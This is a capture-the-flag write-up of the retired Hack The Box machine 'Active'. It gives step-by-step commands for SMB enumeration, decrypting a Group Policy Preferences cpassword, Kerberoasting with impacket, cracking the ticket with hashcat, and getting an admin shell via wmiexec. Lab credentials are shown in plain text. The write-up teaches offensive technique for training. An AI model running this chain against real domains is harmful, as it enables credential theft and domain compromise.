---
title: "Active"
date: 2026-02-08
categories: [HTB]
tags: [windows, active-directory, gpp-decrypt, kerberoasting]
toc: true

image:
  path: /assets/img/htb/Active/active1.png
  alt: "HTB Active"
---

Active is a retired Windows box that focuses on Active Directory enumeration, credential exposure via Group Policy Preferences (GPP), and abuse of Kerberos through Kerberoasting to pivot from a service account to domain administrator.

---

## Recon
### Nmap — Port Discovery
Begin with a full TCP sweep to identify all open ports on the target.

`sudo nmap -p- -T4 10.129.17.166 -oN scans/all_ports.txt -Pn`
![](/assets/img/htb/Active/active01.png)

Parse the results to store all open ports in a variable for follow-up scanning.

`ports=$(awk '/\/tcp/ && /open/ { split($1,a,"/"); p = (p ? p "," a[1] : a[1]) } END{ print p }' scans/all_ports.txt)`

---

### Nmap — Service Enumeration
Run a targeted service and script scan against only the discovered open ports.

`sudo nmap -sC -sV -p $ports 10.129.17.166 -oN scans/services.txt -Pn`
![](/assets/img/htb/Active/active02.png)

---

### Host Resolution
Add the target hostname to /etc/hosts.

`echo '10.129.18.74 active.htb' | sudo tee -a /etc/hosts`

---

## Service Enumeration
### SMB
AD is confirmed. Enumerate SMB with NetExec for any open shares.

`nxc smb 10.129.18.74 -u '' -p '' --shares`
![](/assets/img/htb/Active/active03.png)

SMB shows a readable share called Replication. Use `smbclient` to pull the share.

`mkdir -p Replication && cd Replication`

`smbclient //10.129.18.74/Replication -N -I 10.129.18.74 -c "recurse; prompt; mget *"`
![](/assets/img/htb/Active/active05.png)

Inspect what was pulled down.
`tree -a -h -f --dirsfirst`
![](/assets/img/htb/Active/active04.png)

---

## Initial Access
### GPP cPassword (Groups.xml)
Inside is a Groups.xml file — a classic GPP artifact known to store recoverable credentials. 
Group Policy Preferences (GPP) allowed administrators to push local users, passwords, and group changes through policy files stored in SYSVOL. These files often contain a field called cpassword, which is reversibly encrypted with a public AES key — meaning anyone who can read SYSVOL can decrypt it.
Typical location:
`\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml`
If present, this usually yields a reusable local admin password and can sometimes lead to domain compromise.
Primary tool to exploit:
[gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)

`grep -i cpassword Groups.xml`
![](/assets/img/htb/Active/active065.png)

Discovered username `SVC_TGS`.
Decrypt the embedded cpassword to recover the service account password.

`gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`
![](/assets/img/htb/Active/active06.png)

Validate access with the recovered account:

`nxc smb 10.129.18.74 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares`

![](/assets/img/htb/Active/active07.png)

---

## Privilege Escalation
### Kerberoasting
With valid credentials, perform a Kerberoasting attack to pull crackable service tickets for any high-privilege accounts.

`python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.129.18.74 -request -outputfile tgs_hashes.txt`
![](/assets/img/htb/Active/active08.png)

Crack the Kerberos ticket with `hashcat`.

`hashcat -m 13100 tgs_hashes.txt /home/user/tools/rockyou.txt -a 0`
![](/assets/img/htb/Active/active09.png)

The ticket cracked to domain admin credentials, which I verified over SMB.

`nxc smb 10.129.18.74 -u 'active.htb\Administrator' -p 'Ticketmaster1968' --shares`
![](/assets/img/htb/Active/active10.png)

With admin credentials confirmed, I used WMIExec to get an interactive shell.

`python3 /usr/share/doc/python3-impacket/examples/wmiexec.py 'ACTIVE.HTB/Administrator:Ticketmaster1968'@10.129.18.74`
![](/assets/img/htb/Active/active11.png)

From here, you can get the flags.

`type C:\Users\Administrator\Desktop\root.txt`
![](/assets/img/htb/Active/root.png)

